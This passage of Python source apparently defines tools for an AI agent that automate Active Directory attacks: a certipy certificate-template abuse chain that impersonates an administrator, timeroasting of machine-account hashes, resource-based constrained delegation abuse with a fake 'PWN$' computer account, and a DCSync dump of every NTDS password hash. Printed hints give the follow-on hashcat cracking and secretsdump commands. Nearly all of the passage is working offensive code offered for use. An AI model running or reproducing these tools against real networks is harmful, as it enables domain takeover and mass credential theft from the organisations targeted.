        password:   Cleartext OR
        nt_hash:    NT hash (mutex with password)
        ca:         CA host (only when running abuse)
        template:   Vulnerable template name (only when running abuse)
        upn_target: UPN to impersonate (admin@domain)
        output_dir: Where to save .pfx artifacts (session dir if empty)
    """
    bin_path = shutil.which("certipy") or shutil.which("certipy-ad")
    if not bin_path:
        return "Error: certipy not on PATH. pip install certipy-ad"

    if not output_dir:
        try:
            from src.repl.target_manager import get_target_manager
            output_dir = getattr(get_target_manager(), "session_dir", "") or "."
        except Exception:
            output_dir = "."
    os.makedirs(output_dir, exist_ok=True)

    auth = []
    if password:
        auth = ["-p", password]
    elif nt_hash:
        auth = ["-hashes", f":{nt_hash}" if ":" not in nt_hash else nt_hash]
    else:
        return "Error: provide password or nt_hash"

    # ── Step 1: find vulnerable templates ────────────────────────────────
    find_cmd = [
        bin_path, "find",
        "-u", f"{username}@{domain}",
    ] + auth + [
        "-target-ip", dc_ip,
        "-vulnerable", "-enabled",
        "-output", os.path.join(output_dir, "certipy_find"),
    ]
    find_out = _run(find_cmd, timeout=300)

    # quick diagnosis
    diagnosis = []
    for esc in ("ESC1", "ESC2", "ESC3", "ESC4", "ESC6", "ESC7", "ESC8", "ESC9", "ESC11"):
        if esc in find_out:
            diagnosis.append(esc)

    out = [f"## Certipy ESC chain: {domain} via {username}@{dc_ip}",
           "\n[Step 1: find]",
           find_out[:3000],
           f"\n[Detected ESC classes]: {', '.join(diagnosis) or 'none'}"]

    if not template:
        if diagnosis:
            out.append("\n[Suggested next call]")
            if "ESC1" in diagnosis:
                out.append(f"  certipy_esc_chain(... template=<vuln_tmpl>, ca=<CA>, upn_target=administrator@{domain})")
            if "ESC8" in diagnosis:
                out.append(f"  ESC8 (HTTP enrollment + NTLM relay): coerce victim → ntlmrelayx --target http://{dc_ip}/certsrv/")
            if "ESC11" in diagnosis:
                out.append(f"  ESC11 (RPC encryption flag): certipy req -no-encrypt-cert -ca {ca} -template User")
        return "\n".join(out)

    if not (ca and upn_target):
        return "\n".join(out + ["\nError: ca and upn_target required to run abuse"])

    # ── Step 2: request a cert under attacker UPN ────────────────────────
    req_cmd = [
        bin_path, "req",
        "-u", f"{username}@{domain}",
    ] + auth + [
        "-target-ip", dc_ip,
        "-ca", ca,
        "-template", template,
        "-upn", upn_target,
        "-out", os.path.join(output_dir, "esc_pwn"),
    ]
    req_out = _run(req_cmd, timeout=240)
    out += ["\n[Step 2: req]", req_out[:1500]]

    # ── Step 3: pkinit auth with the .pfx for a TGT ──────────────────────
    pfx = os.path.join(output_dir, "esc_pwn.pfx")
    if os.path.exists(pfx):
        auth_cmd = [
            bin_path, "auth",
            "-pfx", pfx,
            "-username", upn_target.split("@")[0],
            "-domain", domain,
            "-dc-ip", dc_ip,
        ]
        out += ["\n[Step 3: pkinit auth]", _run(auth_cmd, 180)]
        out.append(f"\n[Result] If you got a TGT for {upn_target}, run secretsdump.py -k -no-pass {dc_ip}")
    return "\n".join(out)


# ─────────────────────────────────────────────────────────────────────────────
# Timeroasting
# ─────────────────────────────────────────────────────────────────────────────

@function_tool()
def timeroast(dc_ip: str, rid_range: str = "1000-3000", output_file: str = "") -> str:
    """
    Timeroasting against a DC: sends NTP requests with arbitrary RIDs; valid
    machine accounts respond with a hash signed using the computer-account
    secret. Crackable offline with hashcat -m 31300.

    Args:
        dc_ip:       Domain Controller IP
        rid_range:   Inclusive RID range (default 1000-3000 covers most)
        output_file: Path to write hashes (default <session>/timeroast.hashes)
    """
    bin_path = shutil.which("timeroast") or shutil.which("timeroast.py")
    if not bin_path:
        return ("Error: timeroast not found. Install: "
                "git clone https://github.com/SecuraBV/Timeroast")

    if not output_file:
        try:
            from src.repl.target_manager import get_target_manager
            sd = getattr(get_target_manager(), "session_dir", "") or "."
        except Exception:
            sd = "."
        output_file = os.path.join(sd, "timeroast.hashes")

    cmd = [bin_path, dc_ip, "-r", rid_range, "-o", output_file]
    out = _run(cmd, timeout=600)
    extras = ""
    try:
        size = os.path.getsize(output_file)
        if size > 0:
            extras = (f"\n[+] hashes saved to {output_file} ({size} bytes)\n"
                      f"[Next] hashcat -m 31300 {output_file} /usr/share/wordlists/rockyou.txt")
    except Exception:
        pass
    return f"## Timeroast: {dc_ip} (RID {rid_range})\n\n{out}{extras}"


# ─────────────────────────────────────────────────────────────────────────────
# RBCD via MachineAccountQuota
# ─────────────────────────────────────────────────────────────────────────────

@function_tool()
def rbcd_attack(
    dc_ip: str,
    domain: str,
    attacker_user: str,
    attacker_password: str = "",
    attacker_hash: str = "",
    victim_computer: str = "",
    spoof_user: str = "Administrator",
) -> str:
    """
    Resource-Based Constrained Delegation (RBCD) abuse:
      1) Add a new fake computer account using MachineAccountQuota (10 by default)
      2) Set msDS-AllowedToActOnBehalfOfOtherIdentity on the victim → fake-comp
      3) S4U2self/S4U2proxy as `spoof_user` to obtain a service ticket on victim

    Args:
        dc_ip:             Domain Controller IP
        domain:            AD domain
        attacker_user:     Domain user with WriteProperty on victim_computer
        attacker_password: Attacker password
        attacker_hash:     Attacker NT hash (mutex with password)
        victim_computer:   Victim host (e.g. WS01$)
        spoof_user:        Principal to impersonate (default Administrator)
    """
    if not victim_computer:
        return "Error: victim_computer required"

    addcomputer = shutil.which("impacket-addcomputer") or shutil.which("addcomputer.py")
    rbcd = shutil.which("impacket-rbcd") or shutil.which("rbcd.py")
    getst = shutil.which("impacket-getST") or shutil.which("getST.py")
    if not (addcomputer and rbcd and getst):
        return "Error: requires impacket suite (addcomputer.py, rbcd.py, getST.py)."

    auth = []
    if attacker_password:
        auth_pwd_arg = f"{domain}/{attacker_user}:{attacker_password}"
    elif attacker_hash:
        auth_pwd_arg = f"{domain}/{attacker_user}"
        auth = ["-hashes", f":{attacker_hash}" if ":" not in attacker_hash else attacker_hash]
    else:
        return "Error: provide password or hash"

    fake_name = "PWN$"
    fake_pass = "ExploitMe123!"

    # 1) Add fake computer
    add_cmd = [addcomputer, auth_pwd_arg] + auth + [
        "-method", "LDAPS",
        "-computer-name", fake_name,
        "-computer-pass", fake_pass,
        "-dc-ip", dc_ip,
    ]
    add_out = _run(add_cmd, 180)

    # 2) Set RBCD on victim
    set_cmd = [rbcd, auth_pwd_arg] + auth + [
        "-action", "write",
        "-delegate-to", victim_computer,
        "-delegate-from", fake_name,
        "-dc-ip", dc_ip,
    ]
    set_out = _run(set_cmd, 180)

    # 3) S4U2self/S4U2proxy: get service ticket as spoof_user → cifs/victim
    s4u_cmd = [getst,
               f"{domain}/{fake_name.rstrip('$')}:{fake_pass}",
               "-spn", f"cifs/{victim_computer}",
               "-impersonate", spoof_user,
               "-dc-ip", dc_ip]
    s4u_out = _run(s4u_cmd, 180)

    out = [
        f"## RBCD attack: {attacker_user} → {fake_name} → {victim_computer} (as {spoof_user})",
        "\n[1] Add fake computer", add_out[:1000],
        "\n[2] Write RBCD ACL", set_out[:1000],
        "\n[3] S4U2self → service ticket", s4u_out[:1500],
        "\n[Next] export KRB5CCNAME=$(ls *.ccache); secretsdump.py -k -no-pass " + victim_computer,
    ]
    return "\n".join(out)


# ─────────────────────────────────────────────────────────────────────────────
# DCSync (only after BloodHound confirms GetChanges/GetChangesAll)
# ─────────────────────────────────────────────────────────────────────────────

@function_tool()
def dcsync(
    dc_ip: str,
    domain: str,
    username: str,
    password: str = "",
    nt_hash: str = "",
    output_file: str = "",
) -> str:
    """
    Run secretsdump.py -just-dc to dump every NTDS hash via DRSUAPI replication.
    ONLY run after bloodhound_query("dcsync") confirms the principal has the right.

    Args:
        dc_ip:       DC IP
        domain:      AD domain
        username:    Principal with GetChanges/GetChangesAll
        password:    Cleartext
        nt_hash:     NT hash (mutex with password)
        output_file: Output file prefix (default <session>/dcsync)
    """
    bin_path = shutil.which("impacket-secretsdump") or shutil.which("secretsdump.py")
    if not bin_path:
        return "Error: impacket-secretsdump not on PATH"

    if not output_file:
        try:
            from src.repl.target_manager import get_target_manager
            sd = getattr(get_target_manager(), "session_dir", "") or "."
        except Exception:
            sd = "."
        output_file = os.path.join(sd, "dcsync")

    if password:
        auth_arg = f"{domain}/{username}:{password}@{dc_ip}"
        extra = []
    elif nt_hash:
        auth_arg = f"{domain}/{username}@{dc_ip}"
        extra = ["-hashes", f":{nt_hash}" if ":" not in nt_hash else nt_hash]
    else:
        return "Error: provide password or nt_hash"

    cmd = [bin_path, auth_arg, "-just-dc", "-outputfile", output_file] + extra
    out = _run(cmd, 1200)
    extras = ""
    for ext in (".ntds", ".sam", ".secrets"):
        p = output_file + ext
        if os.path.exists(p):
            extras += f"\n[+] {p} ({os.path.getsize(p)} bytes)"
    return f"## DCSync: {dc_ip} as {username}\n\n{out[:3000]}{extras}\n\n[Next] Crack with hashcat -m 1000 (NTLM)."
